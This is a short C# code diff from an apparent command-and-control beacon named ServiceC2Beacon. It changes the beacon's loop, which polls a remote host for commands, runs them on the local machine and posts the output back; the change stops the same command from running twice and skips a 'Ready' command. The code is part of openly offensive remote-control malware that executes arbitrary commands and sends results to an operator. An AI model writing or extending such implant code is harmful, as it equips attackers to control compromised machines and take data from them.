@@ -240,7 +240,7 @@ namespace ServiceC2Beacon
             //Setting up sleeptimer
             int sleeptime = GetSleepTime(host, serviceName);
             DateTime stopTime = DateTime.Now.AddSeconds(sleeptime);
-
+            string lastCommand = "";
             //C2 loop
             while (active)
             {
@@ -258,7 +258,7 @@ namespace ServiceC2Beacon
                     string lastOutput = ReadOutput(host, serviceName);
                     Console.WriteLine(lastOutput.Length);
 
-                    if (lastOutput.Length <= 0)
+                    if (lastOutput.Length <= 0 && lastCommand != command && !command.Equals("Ready"))
                     {
                         string output = RunCommand(command);
                         PostOutput(host, serviceName, output);
@@ -266,6 +266,7 @@ namespace ServiceC2Beacon
                     }
 
                     stopTime = DateTime.Now.AddSeconds(GetSleepTime(host, serviceName));
+                    lastCommand = command;
                 }
             }
             DisconnectFromService();
